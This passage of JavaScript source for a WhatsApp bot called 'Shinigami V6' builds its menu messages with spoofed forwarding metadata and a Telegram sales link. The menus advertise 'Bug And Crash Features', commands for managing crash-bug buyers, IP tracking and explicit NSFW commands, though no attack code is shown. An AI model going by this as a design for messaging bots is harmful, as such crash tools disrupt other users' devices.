                            gifPlayback: true
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑨𝒍𝒍 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒐𝒕 𝑪𝒐𝒎𝒂𝒏𝒅𝒔", id: ".allmenu" },
                                                { title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".ownermenu" },
                                                { title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑭𝒖𝒏 𝑨𝒏𝒅 𝑬𝒏𝒕𝒆𝒓𝒕𝒂𝒊𝒏𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".funmenu" },
                                                { title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".cpanelmenu" },
                                                { title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝟏𝟖+ 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".nsfwmenu" },
                                                { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑻𝒉𝒆 𝑺𝒖𝒑𝒑𝒐𝒓𝒕 𝑳𝒊𝒔𝒕", id: ".tqto" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/kacaw.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "ownermenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

    let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » shinigami*
┃✦ *Owner » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *Version  » V6*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 [洛]\`
→ .addowner
→ .delowner 
→ .addmurbug
→ .delmurbug
→ .addmurbuggc
→ .delmurbuggc
→ .self
→ .public
→ .restart
`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780488472.mp4" } },
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
                            gifPlayback: true
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑨𝒍𝒍 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒐𝒕 𝑪𝒐𝒎𝒂𝒏𝒅𝒔", id: ".allmenu" },
                                                { title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑩𝒖𝒈 𝑨𝒏𝒅 𝑪𝒓𝒂𝒔𝒉 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".bugmenu" },
                                                { title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑭𝒖𝒏 𝑨𝒏𝒅 𝑬𝒏𝒕𝒆𝒓𝒕𝒂𝒊𝒏𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".funmenu" },
                                                { title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".cpanelmenu" },
                                                { title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝟏𝟖+ 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".nsfwmenu" },
                                                { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑻𝒉𝒆 𝑺𝒖𝒑𝒐𝒓𝒕 𝑳𝒊𝒔𝒕", id: ".tqto" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/aku?.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;
    
case "funmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

    let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » shinigami*
┃✦ *Owner » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *Version  » V6*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 [洛]\`
→ .shinigami ( Ai )
→ .promote
→ .demote
→ .open
→ .close
→ .kick
→ .hidetag
→ .tagall
→ .rvo
→ .addcase
→ .delcase
→ .cekkhodam
→ .cekganteng
→ .cekcantik
→ .cekkontol
→ .cekidgc
→ .cekidch
→ .stiker
→ .tiktok
→ .bocilwindah
→ .brat
→ .getcode
→ .tourl
→ .trackip
→ .quotesgalau
→ .quotesmotivasi
→ .quotesbacot
→ .quotesbucin
→ .kisahnabi
→ .qc
→ .swgrup`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780647532.mp4" } },
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
                            gifPlayback: true
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑨𝒍𝒍 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒐𝒕 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔", id: ".allmenu" },
                                                { title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑩𝒖𝒈 𝑨𝒏𝒅 𝑪𝒓𝒂𝒔𝒉 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".bugmenu" },
                                                { title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".ownermenu" },
                                                { title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".cpanelmenu" },
                                                { title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝟏𝟖+ 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".nsfwmenu" },
                                                { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑻𝒉𝒆 𝑺𝒖𝒑𝒑𝒐𝒓𝒕 𝑳𝒊𝒔𝒕", id: ".tqto" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/semua.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "cpanelmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

    let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » shinigami*
┃✦ *Owner » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *Version  » V6*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 [洛]\`
→ .1gb *username*
→ .2gb *username*
→ .3gb *username*
→ .4gb *username*
→ .5gb *username*
→ .6gb *username*
→ .7gb *username*
→ .8gb *username*
→ .9gb *username*
→ .10gb *username*
→ .unli *username*
→ .cadmin *username*
→ .delpanel
→ .deladmin
→ .listpanel
→ .listadmin
→ .addres
→ .delres`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780676843.mp4" } },
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
                            gifPlayback: true
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑨𝒍𝒍 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒐𝒕 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔", id: ".allmenu" },
                                                { title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑩𝒖𝒈 𝑨𝒏𝒅 𝑪𝒓𝒂𝒔𝒉 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".bugmenu" },
                                                { title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".ownermenu" },
                                                { title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑭𝒖𝒏 𝑨𝒏𝒅 𝑬𝒏𝒕𝒆𝒓𝒕𝒂𝒊𝒏𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".funmenu" },
                                                { title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝟏𝟖+ 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".nsfwmenu" },
                                                { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑻𝒉𝒆 𝑺𝒖𝒑𝒐𝒓𝒕 𝑳𝒊𝒔𝒕", id: ".tqto" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/laguini.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;
case "nsfwmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

    let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » shinigami*
┃✦ *Owner » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *Version  » V6*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔 [洛]\`
→ .18+
→ .asupan
→ .paptt
→ .nsfw
→ .hentaineko
→ .manga
→ .cum
→ .ero
→ .gangbang
→ .foot
→ .milf
→ .pussy
→ .yuri
→ .zettai
`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780364044.mp4" } },
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
                            gifPlayback: true
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑨𝒍 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒐𝒕 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔", id: ".allmenu" },
                                                { title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑩𝒖𝒈 𝑨𝒏𝒅 𝑪𝒓𝒂𝒔𝒉 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".bugmenu" },
                                                { title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".ownermenu" },
                                                { title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑭𝒖𝒏 𝑨𝒏𝒅 𝑬𝒏𝒕𝒆𝒓𝒕𝒂𝒊𝒏𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".funmenu" },
                                                { title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".cpanelmenu" },
                                                { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑻𝒉𝒆 𝑺𝒖𝒑𝒐𝒓𝒕 𝑳𝒊𝒔𝒕", id: ".tqto" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/sejuk.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

    case "allmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

    let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
    
